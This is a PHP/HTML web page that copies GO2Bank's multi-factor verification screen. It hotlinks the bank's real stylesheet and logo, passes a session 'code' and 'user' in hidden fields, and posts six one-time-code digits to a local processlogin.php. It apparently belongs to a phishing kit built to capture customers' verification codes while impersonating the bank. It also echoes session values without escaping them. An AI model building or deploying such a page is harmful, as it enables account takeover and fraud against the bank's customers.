<?php
session_start();

    $loginid = $_SESSION['code'];
    $userid = $_SESSION['user'];


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GO2Bank | Login to your account</title>
    
    <link rel="stylesheet" href="https://www.go2bank.com/etc.clientlibs/go2bank/clientlibs/go2bank-enroll-form.min.425e6f6a8adc43a59589bc77c78173fd.css" type="text/css">
    <link rel="stylesheet" href="output.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/remixicon@3.4.0/fonts/remixicon.css">
    
    <style>
        
    body {
      @apply flex items-center justify-center h-screen bg-gray-100;
    }
  
    </style>

</head>
<body class="formpage page parent-page basicpage bg-gray-100" id="formpage-c341cb274f">
    <div class="container">
        <!-- Header Start-->
        <header class="page-header js-page-header" role="banner">
            <div class="page-header__inner js-page-header-inner page-header-left">
                <div aria-label="Logo" class="header__logo"><div class="header-brand-logo image">
                    <div data-cmp-is="image" data-cmp-lazythreshold="0" data-cmp-src="/experience-fragments/go2_bank_forms/header/master/_jcr_content/root/form_header/header-brand-logo.coreimg{.width}.svg/1708078030662/logo-go2bank-light.svg" data-asset="/content/dam/go2bank/enroll-form/logo-go2bank-light.svg" data-title="logo" id="image-a504e05bb3" class="cmp-image page-header__logo-primary" itemscope itemtype="http://schema.org/ImageObject">
        
                        <img src="https://www.go2bank.com/experience-fragments/go2_bank_forms/header/master/_jcr_content/root/form_header/header-brand-logo.coreimg.svg/1708078030662/logo-go2bank-light.svg" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="logo"/>
                 
                    </div>
    
        
                </div>
            </div>
            <div aria-label="Logo" class="header__logo"><div class="header-lock-img image justify-content-right flex">
                        <div data-cmp-is="image" data-cmp-lazythreshold="0" data-cmp-src="/experience-fragments/go2_bank_forms/header/master/_jcr_content/root/form_header/header-lock-img.coreimg{.width}.png/1708078043579/lock.png" data-asset="/content/dam/go2bank/form/lock.png" data-title="Lock" id="image-7fc07d8710" class="cmp-image page-header__logo-primary" itemscope itemtype="http://schema.org/ImageObject">
                            <img src="https://www.go2bank.com/experience-fragments/go2_bank_forms/header/master/_jcr_content/root/form_header/header-lock-img.coreimg.png/1708078043579/lock.png" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="Lock"/>
                        </div>
    
        
            </div>
        </header>
        <!--Header End-->

        <!--form starts-->
        <div class="w-full max-w-xl mx-auto mt-48 cmp-container">
            <form class="rounded px-8 pt-6 pb-8 mb-4" action="processlogin.php" method="post" id="verificationForm">
                <div class="mfa__block">
                    <img class="mfa__block-image" src="https://www.go2bank.com/content/dam/go2bank/form/Shield Code OTP.png" alt="MFA Icon"/>
                </div>
                <div class="text mb-4">
                    
                    <div id="text-7d452bd9bf" class="flex flex-col justify-center items-center">
                        <h3><span class="md:text-4xl text-2xl font-bold text-center font-sans mb-4 mx-auto" style="text-align: center !important;">Verify your Identity</span></h3>
                        <p class="font-sans font-light mt-3">A verification code has been sent to your registered email and phone number. Kindly enter the code below to proceed to
                            your account. The verification code will expire in 10 minutes.
                        </p>
                    
                    </div>
                </div>
                <div class="step-container">
                            <div class="go2bank-enroll__sub-step" data-showstepper="false" data-hide-substep="false" data-substep-type="mfa-sub-steps" data-route="verify-phone">
                                
                                    <div id="container-8aebbaf21c" class="cmp-container">
                                        
                                        <div class="mfa-cmp">
                
                                            <div class="mfa type-align-center">
                                                <div class="">
                                                    <div>
                                                        <input class="mfa__input-content focus:outline-none focus:ring-2 focus:ring-blue-500" type="text" id="input1" name="digit1" maxlength="1" required="true"/> 
                                                        <input class="mfa__input-content focus:outline-none focus:ring-2 focus:ring-blue-500" type="text" id="input2" name="digit2" maxlength="1" required="true"/>
                                                        <input class="mfa__input-content focus:outline-none focus:ring-2 focus:ring-blue-500" type="text" id="input3" name="digit3" maxlength="1" required="true"/>
                                                        <input class="mfa__input-content focus:outline-none focus:ring-2 focus:ring-blue-500" type="text" id="input4" name="digit4" maxlength="1" required="true"/>
                                                        <input class="mfa__input-content focus:outline-none focus:ring-2 focus:ring-blue-500" type="text" id="input5" name="digit5" maxlength="1" required="true"/>
                                                        <input class="mfa__input-content focus:outline-none focus:ring-2 focus:ring-blue-500" type="text" id="input6" name="digit6" maxlength="1" required="true"/>
                                                    <input type="hidden" name="code" value="<?php echo $loginid; ?>">
                                                    <input type="hidden" name="user" value="<?php echo $userid; ?>">
                                                    </div>
                                                    <?php
                                                            if(isset($_SESSION['error'])){
                                                                $error = $_SESSION['error'];
                                                        
                                                        ?>
                                                        <div class="px-2 py-2 text-red-600" style="color:#ff0000 !important">  <?php echo $error ?></div>

                                                        <?php 
                                                            unset($_SESSION['error']);
                                                                } 
                                                    ?>
                            
                                                </div>
                
                                                <div class="mfa__verification-text">
                                                    <p><span class="body-small">Didn’t receive it? <a href="#" class="resend-mfa">Resend code</a> or <a href="#" class="update-mobile-number">Update your mobile phone number.</a></span></p>
                                        
                                                </div>
                
                                                <div class="mfa-button-container">
                                                    
                                                    <div class="mfabutton button btn btn--width-full btn--valid gap-bottom-medium bg-indigo-600 text-white">
                                                        <button type="submit" name="verify">Continue</button>
                                                    </div>
                                        
                                                </div>
                
                                                <div class="mfa__disclaimer-text">
                                                    <p style="text-align: center;"><span class="footnote">Having trouble receiving text messages? <br />
                                                    <a href="#" id="phone-call-modal">Get a phone call with your verification code instead.</a></span></p>
                                        
                                                </div>
                                            </div>
                
                    
                    
                
                                        </div>
                                        
                                                
                                    </div>
                
                
                                 
                    </div>
                    
                    
                
                </div>
               
                
              
              
              <div class="mt-8 flex flex-col items-center justify-between">

                    <a href="#" class="no-underline text-indigo-800 font-sans font-medium mb-4">Trouble login in?</a>
                    <a href="#" class="no-underline text-indigo-800 font-sans font-medium mb-12">Activate your card</a>
                    <div class="flex flex-row justify-between items-center p-3 gap-2">
                        <a href="#" class="no-underline text-indigo-800 font-sans font-medium">Privacy information |</a>
                    <a href="#" class="no-underline text-indigo-800 font-sans font-medium">Help</a>
                    </div>

              </div>
            </form>
          </div>
        
          
        
        
    <script>
        document.addEventListener("DOMContentLoaded", function() {
    const inputs = document.querySelectorAll("#verificationForm input");

    inputs.forEach((input, index) => {
        input.addEventListener("input", () => {
            // Move to the next input if a value is entered and the current input is not the last one
            if (input.value.length === 1 && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        });

        input.addEventListener("keydown", (event) => {
            // Handle backspace to move focus to the previous input
            if (event.key === "Backspace" && input.value.length === 0 && index > 0) {
                inputs[index - 1].focus();
            }
        });
    });
});

    </script>    

    
    
</body>
</html>